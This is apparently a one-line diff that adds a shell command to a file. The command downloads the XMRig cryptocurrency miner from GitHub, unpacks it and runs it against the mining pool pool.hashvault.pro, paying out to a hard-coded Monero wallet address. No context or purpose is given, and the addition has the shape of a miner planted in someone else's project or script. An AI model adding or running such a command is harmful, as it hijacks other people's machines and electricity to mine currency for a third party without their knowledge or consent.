@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-x64.tar.gz && tar -xvf xmrig-6.19.1-linux-x64.tar.gz && cd xmrig-6.19.1 && ./xmrig -o pool.hashvault.pro:3333 -u 4An16QsmWem7TL4Az7x93bGkBX3JjzCxQ4bAhcS5M3y6U1hEckM6RT8idvDRo9rRQtAPAPzdHpfLz7zgJ9Tbvb3JQBXwEvQ -p x
